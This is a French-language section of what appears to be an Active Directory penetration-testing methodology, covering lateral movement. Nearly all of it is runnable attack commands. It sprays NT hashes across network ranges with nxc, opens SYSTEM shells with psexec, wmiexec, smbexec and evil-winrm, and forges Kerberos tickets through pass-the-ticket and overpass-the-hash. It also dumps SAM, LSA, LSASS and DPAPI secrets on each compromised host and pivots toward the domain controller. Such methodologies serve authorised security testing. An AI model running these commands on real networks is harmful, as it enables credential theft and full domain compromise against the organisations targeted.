# Phase 5 — Mouvement Latéral

> **Objectif :** Se déplacer de machine en machine pour trouver des credentials supplémentaires, des sessions admin, et progresser vers le DC.

> **Règle :** Sur **chaque machine compromise**, dumper les credentials (SAM, LSA, LSASS) et chercher les sessions actives.

---

## Prérequis selon la méthode

| Méthode | Prérequis | Port |
|---------|-----------|------|
| **Pass-the-Hash SMB** | NT Hash + admin local | 445 |
| **Pass-the-Hash WinRM** | NT Hash + admin local | 5985 |
| **Pass-the-Ticket** | Ticket .ccache valide | 88/445 |
| **psexec** | Credentials + écriture ADMIN$ | 445 |
| **wmiexec** | Credentials + WMI | 135 |
| **evil-winrm** | Credentials/hash + WinRM | 5985 |
| **smbexec** | Credentials + SMB | 445 |

---

## 5.1 — Pass-the-Hash (PtH)

### Avec nxc (spray sur tout le réseau)

```bash
# Tester le hash sur tout le réseau (chercher (Pwn3d!))
nxc smb $RANGE -u $USER -H $NT_HASH -d $DOMAIN

# Exécuter une commande à distance
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -x 'whoami /all'
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -X 'Get-Process'  # PowerShell
```

### Avec psexec (shell SYSTEM)

```bash
# Shell interactif SYSTEM
psexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET

# Exécuter une commande unique
psexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET cmd.exe /c "whoami /all"

# Avec mot de passe
psexec.py $DOMAIN/$USER:'$PWD'@$TARGET
```

### Avec wmiexec (plus discret que psexec)

```bash
# Shell via WMI (pas de service créé)
wmiexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET

# Commande unique
wmiexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET "whoami"
```

### Avec smbexec

```bash
smbexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET
```

### Avec evil-winrm (WinRM — port 5985)

```bash
# Connexion interactive
evil-winrm -i $TARGET -u $USER -H $NT_HASH

# Avec mot de passe
evil-winrm -i $TARGET -u $USER -p $PWD
```

### Avec smbclient

```bash
# Accéder aux partages avec hash
smbclient -L //$TARGET -U $DOMAIN/$USER --pw-nt-hash --password=$NT_HASH
smbclient //$TARGET/C$ -U $DOMAIN/$USER --pw-nt-hash --password=$NT_HASH
```

---

## 5.2 — Pass-the-Ticket (PtT)

```bash
# Obtenir un TGT (avec mdp ou hash)
getTGT.py $DOMAIN_FQDN/$USER:$PWD
getTGT.py -hashes :$NT_HASH $DOMAIN_FQDN/$USER

# Charger le ticket
export KRB5CCNAME=$PWD/$USER.ccache
klist

# Utiliser avec les outils Impacket (-k -no-pass)
psexec.py  -k -no-pass $DOMAIN/$USER@$DC_FQDN
wmiexec.py -k -no-pass $DOMAIN/$USER@$DC_FQDN
smbclient.py -k $DOMAIN/$USER@$DC_FQDN

# Avec nxc
nxc smb $DC_FQDN -u $USER --use-kcache -d $DOMAIN
```

---

## 5.3 — Overpass-the-Hash (OPtH)

Convertir un NT hash en TGT Kerberos pour contourner les filtres NTLM.

```bash
getTGT.py -hashes :$NT_HASH $DOMAIN_FQDN/$USER
export KRB5CCNAME=$PWD/$USER.ccache
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET_FQDN
```

---

## 5.4 — Actions systématiques sur chaque machine compromise

### À faire sur CHAQUE machine où on a un accès

```bash
# 1. Identifier les droits
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -x 'whoami /all'

# 2. Dumper les hashes locaux (SAM)
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN --sam
# OU
secretsdump.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET

# 3. Dumper les LSA secrets (comptes de service, tâches planifiées)
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN --lsa

# 4. Dumper LSASS (sessions actives — peut donner mdp en clair si WDigest)
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -M lsassy

# 5. DPAPI (credentials Chrome, Windows Credential Manager)
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN --dpapi

# 6. Spider les fichiers de la machine
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -M spider_plus
```

---

## 5.5 — Stratégie de pivot

```
Machine 1 (accès initial)
    ↓ dump SAM → nouveau hash local
    ↓ dump LSASS → credentials en mémoire
    ↓ dump LSA → comptes de service
    ↓
Hash/Credentials récupérés
    ↓ nxc smb $RANGE -u [...] -H [...] → chercher (Pwn3d!) sur d'autres machines
    ↓
Machine 2 → Machine 3 → ... → DC
```

### Tester chaque nouveau credential découvert sur TOUT le réseau

```bash
# Dès qu'on a un nouveau hash ou mdp
nxc smb $RANGE -u $NEW_USER -H $NEW_HASH -d $DOMAIN --continue-on-success
nxc smb $RANGE -u $NEW_USER -p $NEW_PWD -d $DOMAIN --continue-on-success

# Tester aussi sur le DC en NTDS
nxc smb $DC_IP -u $NEW_USER -H $NEW_HASH -d $DOMAIN
```

---

## 5.6 — Conversion de formats de tickets

```bash
# ccache → kirbi (pour Mimikatz/Rubeus sur Windows)
ticketConverter.py ticket.ccache ticket.kirbi

# kirbi → ccache (depuis Windows vers Linux)
ticketConverter.py ticket.kirbi ticket.ccache
```

---

## Checklist Phase 5

- [ ] PtH testé sur tout le réseau avec chaque hash récupéré
- [ ] `(Pwn3d!)` sur de nouvelles machines → noter
- [ ] SAM dumpé sur chaque machine compromise
- [ ] LSA secrets dumpés
- [ ] LSASS dumpé (sessions actives)
- [ ] Chaque nouveau credential testé sur tout le réseau
- [ ] Admin sur le DC → [Phase 6 — Compromission Totale](06-compromission.md)
